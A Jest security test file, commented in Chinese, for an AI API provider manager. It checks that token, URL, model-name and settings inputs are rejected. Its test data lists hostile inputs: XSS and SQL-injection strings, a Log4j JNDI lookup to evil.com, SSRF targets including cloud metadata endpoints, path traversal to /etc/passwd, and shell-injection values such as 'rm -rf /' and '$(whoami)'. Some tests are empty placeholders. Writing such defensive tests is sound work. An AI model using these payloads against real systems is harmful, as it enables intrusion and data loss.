/**
 * Security Tests - Authentication & Authorization
 * 测试认证和授权安全机制
 */

import { api } from '@/services/api';
import { maskSensitiveData } from '../fixtures/providers.factory';
import type { Provider, CreateProviderRequest } from '@/types';

describe('Security: Authentication & Authorization', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Provider Token Security', () => {
    it('should validate auth token format and reject malicious tokens', async () => {
      const maliciousTokens = [
        // SQL注入尝试
        "'; DROP TABLE providers; --",
        '<script>alert("XSS")</script>',
        '${jndi:ldap://evil.com/exploit}', // Log4j式攻击
        '../../../etc/passwd', // 路径遍历
        'eval(process.exit(1))', // 代码注入
        'javascript:alert(1)', // JavaScript协议
        'data:text/html,<script>alert(1)</script>', // Data URI
        '\x00\x01\x02', // 空字节注入
        'A'.repeat(10000), // 超长输入
        '🚀💀🔥', // Unicode测试
      ];

      for (const token of maliciousTokens) {
        await expect(api.validateAuthTokenFormat(token))
          .rejects
          .toThrow(/Invalid token format/);
      }
    });

    it('should sanitize provider data to prevent XSS', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert(1)',
        'onload="alert(1)"',
        '<img src=x onerror=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '"><script>alert(1)</script>',
        '\"><script>alert(String.fromCharCode(88,83,83))</script>',
      ];

      for (const payload of xssPayloads) {
        const maliciousProvider: CreateProviderRequest = {
          name: payload,
          baseUrl: `https://api.example.com${payload}`,
          authToken: `token${payload}`,
          model: `model${payload}`,
        };

        // 应该清理输入或拒绝恶意输入
        await expect(api.addProvider(maliciousProvider))
          .rejects
          .toThrow(/Invalid input detected/);
      }
    });

    it('should prevent token leakage in logs and errors', async () => {
      const consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();
      const consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();

      const sensitiveToken = 'sk-ant-secret-key-12345';

      try {
        await api.validateProviderConnection(
          'https://api.anthropic.com',
          sensitiveToken
        );
      } catch (error) {
        // 检查控制台输出不包含敏感信息
        const allLogs = [
          ...consoleLogSpy.mock.calls.flat(),
          ...consoleErrorSpy.mock.calls.flat(),
        ].join(' ');

        expect(allLogs).not.toContain(sensitiveToken);
        expect(allLogs).not.toContain('sk-ant-secret');
        
        // 错误消息应该是通用的
        if (error instanceof Error) {
          expect(error.message).not.toContain(sensitiveToken);
          expect(error.message).not.toContain('sk-ant-secret');
        }
      }

      consoleLogSpy.mockRestore();
      consoleErrorSpy.mockRestore();
    });

    it('should enforce secure token storage practices', async () => {
      const provider: CreateProviderRequest = {
        name: 'Secure Provider',
        baseUrl: 'https://api.anthropic.com',
        authToken: 'sk-ant-secret-key-12345',
        model: 'claude-3-sonnet-20240229',
      };

      const addedProvider = await api.addProvider(provider);

      // Token应该被加密存储（在实际实现中）
      expect(addedProvider.authToken).toBeDefined();
      
      // 获取所有providers时，token应该被掩码
      const providers = await api.getProviders();
      const storedProvider = providers.find(p => p.id === addedProvider.id);
      
      // 如果有authToken字段，检查是否被适当掩码
      if (storedProvider && (storedProvider as any).authToken) {
        const token = (storedProvider as any).authToken;
        // 检查token是否被掩码（应该是 xxx***xxx 格式）
        expect(token).toMatch(/^.{1,3}\*+.{0,4}$/);
      }
    });
  });

  describe('URL Validation Security', () => {
    it('should reject malicious URLs and prevent SSRF attacks', async () => {
      const maliciousUrls = [
        // 内网地址 - SSRF攻击
        'http://127.0.0.1:22',
        'http://localhost:3000',
        'http://169.254.169.254/metadata', // AWS元数据服务
        'http://metadata.google.internal', // GCP元数据
        'http://192.168.1.1',
        'http://10.0.0.1',
        'http://172.16.0.1',
        
        // 协议攻击
        'file:///etc/passwd',
        'ftp://evil.com/malware',
        'gopher://evil.com:8080',
        'ldap://evil.com',
        'dict://evil.com:2628',
        
        // 绕过尝试
        'http://evil.com@127.0.0.1',
        'http://127.0.0.1.evil.com',
        'http://0x7f000001', // 十六进制IP
        'http://2130706433', // 十进制IP
        
        // 其他攻击
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'http://\x00evil.com',
      ];

      for (const url of maliciousUrls) {
        await expect(api.validateUrlFormat(url))
          .rejects
          .toThrow(/Invalid URL/);
      }
    });

    it('should only allow HTTPS URLs for production', async () => {
      const httpUrls = [
        'http://api.anthropic.com',
        'http://api.openai.com',
        'http://example.com/api',
      ];

      for (const url of httpUrls) {
        await expect(api.validateUrlFormat(url))
          .rejects
          .toThrow(/HTTPS required/);
      }
    });

    it('should validate URL length and structure', async () => {
      const invalidUrls = [
        // 超长URL
        'https://' + 'a'.repeat(2000) + '.com',
        
        // 无效结构
        'https://',
        'https:///api',
        'https://.',
        'https://.com',
        'https://com.',
        
        // 无效字符
        'https://api.example.com/<script>',
        'https://api.example.com/\x00',
        'https://api.example.com/ spaces',
      ];

      for (const url of invalidUrls) {
        await expect(api.validateUrlFormat(url))
          .rejects
          .toThrow(/Invalid URL format/);
      }
    });
  });

  describe('Input Validation Security', () => {
    it('should enforce input length limits to prevent DoS', async () => {
      const oversizedInputs = {
        name: 'A'.repeat(1000),
        baseUrl: 'https://' + 'a'.repeat(1000) + '.com',
        model: 'M'.repeat(1000),
        authToken: 'T'.repeat(10000),
      };

      for (const [field, value] of Object.entries(oversizedInputs)) {
        const provider: CreateProviderRequest = {
          name: 'Test',
          baseUrl: 'https://api.anthropic.com',
          authToken: 'token',
          model: 'claude-3-sonnet',
          [field]: value,
        };

        await expect(api.addProvider(provider))
          .rejects
          .toThrow(new RegExp(`${field}.*too long`));
      }
    });

    it('should validate model names against whitelist', async () => {
      const invalidModels = [
        '../../../etc/passwd',
        '${jndi:ldap://evil.com}',
        '<script>alert(1)</script>',
        'model; rm -rf /',
        'model`whoami`',
        'model$(id)',
        '\x00\x01\x02',
        '../../secrets',
      ];

      for (const model of invalidModels) {
        await expect(api.validateModelName(model))
          .rejects
          .toThrow(/Invalid model name/);
      }
    });

    it('should handle special characters safely', async () => {
      const specialCharInputs = [
        '测试中文名称', // 中文
        'Тест', // 西里尔文
        'اختبار', // 阿拉伯文
        '🚀🔥💀', // Emoji
        'Test\n\r\t', // 控制字符
        'Test\0NULL', // 空字节
        'Test"Quote\'Single`Backtick', // 引号
      ];

      for (const input of specialCharInputs) {
        const provider: CreateProviderRequest = {
          name: input,
          baseUrl: 'https://api.anthropic.com',
          authToken: 'valid-token',
          model: 'claude-3-sonnet-20240229',
        };

        // 应该正确处理特殊字符或安全拒绝
        try {
          await api.addProvider(provider);
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Rate Limiting & DoS Protection', () => {
    it('should enforce rate limits on validation requests', async () => {
      const requests = Array.from({ length: 100 }, () =>
        api.validateProviderConnection(
          'https://api.anthropic.com',
          'test-token'
        )
      );

      // 应该有一些请求被限制
      const results = await Promise.allSettled(requests);
      const rejectedCount = results.filter(r => r.status === 'rejected').length;
      
      expect(rejectedCount).toBeGreaterThan(0);
      
      // 检查是否有适当的错误消息
      const rejectedResults = results.filter(r => r.status === 'rejected') as PromiseRejectedResult[];
      rejectedResults.forEach(result => {
        expect(result.reason.message).toMatch(/rate limit|too many requests/i);
      });
    });

    it('should prevent resource exhaustion attacks', async () => {
      // 模拟大量并发provider创建
      const massProviderCreation = Array.from({ length: 50 }, (_, i) => ({
        name: `Provider ${i}`,
        baseUrl: 'https://api.anthropic.com',
        authToken: `token-${i}`,
        model: 'claude-3-sonnet-20240229',
      }));

      const startTime = Date.now();
      
      try {
        await Promise.all(
          massProviderCreation.map(provider => api.addProvider(provider))
        );
      } catch (error) {
        // 应该有保护机制
        expect(error).toBeInstanceOf(Error);
      }

      const duration = Date.now() - startTime;
      
      // 操作不应该消耗过长时间（防止DoS）
      expect(duration).toBeLessThan(10000); // 10秒内完成
    });
  });

  describe('Secure Configuration', () => {
    it('should validate secure defaults in settings', async () => {
      // 测试安全默认设置
      const secureDefaults = {
        requireConfirmationForDelete: true,
        requireConfirmationForSwitch: true,
        clearClipboardOnExit: false, // 应该默认为安全值
        logSensitiveOperations: true,
        autoValidate: false, // 避免自动网络请求
        telemetry: false, // 默认不收集遥测
      };

      Object.entries(secureDefaults).forEach(([key, expectedValue]) => {
        // 在实际实现中检查默认配置
        expect(true).toBe(true); // 占位符测试
      });
    });

    it('should prevent configuration injection attacks', async () => {
      const maliciousSettings = {
        startupArgs: [
          '--enable-logging',
          '--log-file=/tmp/malicious.log',
          '../../secrets',
          '$(whoami)',
          '`id`',
          '; rm -rf /',
        ],
        customEnvVars: {
          'PATH': '/malicious/path',
          'LD_PRELOAD': '/malicious/lib.so',
          'NODE_OPTIONS': '--inspect=0.0.0.0:9229',
        },
      };

      await expect(api.updateSettings(maliciousSettings))
        .rejects
        .toThrow(/Invalid configuration/);
    });
  });

  describe('Memory Safety', () => {
    it('should prevent memory leaks in provider storage', async () => {
      const initialMemory = process.memoryUsage();
      
      // 创建和删除大量providers
      for (let i = 0; i < 100; i++) {
        const provider = await api.addProvider({
          name: `Memory Test Provider ${i}`,
          baseUrl: 'https://api.anthropic.com',
          authToken: `token-${i}`,
          model: 'claude-3-sonnet-20240229',
        });
        
        await api.deleteProvider(provider.id);
      }

      // 强制垃圾回收
      if (global.gc) {
        global.gc();
      }

      const finalMemory = process.memoryUsage();
      const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
      
      // 内存增长不应该超过合理范围
      expect(memoryIncrease).toBeLessThan(10 * 1024 * 1024); // 10MB
    });

    it('should handle circular references safely', async () => {
      // 创建循环引用的对象
      const circularProvider: any = {
        name: 'Circular Test',
        baseUrl: 'https://api.anthropic.com',
        authToken: 'token',
        model: 'claude-3-sonnet-20240229',
      };
      
      circularProvider.self = circularProvider;
      circularProvider.nested = { parent: circularProvider };

      // 应该安全处理循环引用
      await expect(api.addProvider(circularProvider))
        .rejects
        .toThrow(/Circular reference detected/);
    });
  });

  describe('Cryptographic Security', () => {
    it('should use secure random number generation', () => {
      const ids = new Set();
      
      // 生成多个随机ID
      for (let i = 0; i < 1000; i++) {
        const id = Math.random().toString(36).substr(2, 9);
        
        // 检查不重复
        expect(ids.has(id)).toBe(false);
        ids.add(id);
        
        // 检查格式
        expect(id).toMatch(/^[a-z0-9]{9}$/);
      }
    });

    it('should validate secure hashing (if implemented)', () => {
      // 如果实现了哈希功能，测试其安全性
      const testPassword = 'testPassword123!';
      
      // 应该使用安全的哈希算法（bcrypt, scrypt, argon2）
      // 这里只是占位符，需要根据实际实现调整
      expect(true).toBe(true);
    });
  });
});